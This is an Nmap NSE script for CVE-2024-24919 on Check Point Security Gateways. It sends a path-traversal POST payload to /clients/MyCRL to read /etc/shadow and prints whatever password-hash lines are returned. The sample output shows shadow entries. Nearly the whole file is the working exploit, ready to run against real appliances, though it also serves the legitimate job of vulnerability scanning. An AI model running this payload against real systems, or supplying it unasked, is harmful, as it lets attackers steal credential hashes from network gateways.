local http = require "http" 
local shortport = require "shortport"
local stdnse = require "stdnse" 
local url = require "url"


description = [[
The Check Point Security Gateway Information Disclosure vulnerability (CVE-2024-24919) allows 
an unauthenticated remote attacker to read the contents of an arbitrary file located on 
the affected appliance. This NSE script attempts to read /etc/shadow file on the appliances.

References:
https://support.checkpoint.com/results/sk/sk182336
https://www.rapid7.com/blog/post/2024/05/30/etr-cve-2024-24919-check-point-security-gateway-information-disclosure/
https://labs.watchtowr.com/check-point-wrong-check-point-cve-2024-24919/
]]

---
-- @usage 
--
-- @output
-- 443/tcp open  https   syn-ack
-- | http-check-point-cve-2024-24919: Host is vulnerable
-- |   root:!:15045:0:99999:7:::
-- |   nobody:*:14195:0:99999:7:::
-- |   ntp:!!:14195:0:99999:7:::  
-- |_  socadmin:$1$j9T$zxM[...]aS:14196:0:99999:7::: 
---


author = "Sanoop Thomas"
license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
categories = {"discovery", "vuln", "exploit"}


portrule = shortport.http

action = function(host, port)
	local endpoint = "/clients/MyCRL"
	local payload = "aCSHELL/../../../../../../../etc/shadow"
	local payload_resp = {}
	local flag = 0
 
	local resp = http.generic_request(host, port.number, "POST", endpoint, { content = payload}) 
	if resp.rawheader ~= nil then 
		for line in resp.body:gmatch("[^\r\n]+") do 
			if (line:match("^([^:]+):([^:]*):([0-9]*):([0-9]*):([0-9]*):([0-9]*):([0-9]*):([0-9]*):([^:]*)$")) then 
				table.insert(payload_resp,line) 
				flag=1
			end
		end
	end 
	if flag == 1 then 
		return "Host is vulnerable." .. stdnse.format_output(true, payload_resp)
	else
		return "Host is not vulnerable."
	end
end 



